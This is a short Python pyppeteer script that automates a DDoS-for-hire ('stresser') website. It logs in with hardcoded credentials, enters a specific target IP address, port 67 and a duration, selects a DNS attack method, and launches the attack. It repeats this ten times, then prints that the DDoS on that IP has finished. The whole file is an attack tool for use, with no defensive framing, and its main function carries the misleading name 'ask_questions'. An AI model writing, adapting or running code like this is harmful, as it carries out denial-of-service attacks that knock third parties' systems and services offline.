import asyncio
from pyppeteer import launch
import time

async def sleep(seconds):
    await asyncio.sleep(seconds)

async def ask_questions():
    username = "crabman1"
    password = "crabbyman1"
    total_loops = 10
    ip = '46.8.245.78'
    port = '67'
    delay_time = "60"

    for i in range(int(total_loops)):
        browser = await launch(headless=False)
        page = await browser.newPage()
        await page.goto('https://www.stressthem.se/login')
        await page.waitForSelector('#username')
        await page.type('#username', username)
        await page.type('#password', password)
        await sleep(0.1)
        await page.click('.btn.sf.color')
        await sleep(5)
        await page.goto('https://www.stressthem.se/hub')
        await page.waitForSelector('#host')
        await page.type('#host', ip)
        await page.type('#port', port)
        await page.type('#time', delay_time)
        await page.click('#method')
        await page.waitForSelector('#method option')
        await page.select('#method', 'DNS')
        await page.click('.btn.sf')
        await sleep(0.25)
        await page.evaluate('''() => {
            const startButton = document.evaluate('/html/body/div[2]/div[3]/div[3]/div[2]/div[2]/form/div[2]/button', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            startButton.click();
        }''')
        await sleep(1)
        await page.reload()
        await sleep(60.5)
        print(f'Still running! Run time: {i + 1} mins!')
        await browser.close()

    print('Finished the DDoS for IP:', ip)

asyncio.get_event_loop().run_until_complete(ask_questions())
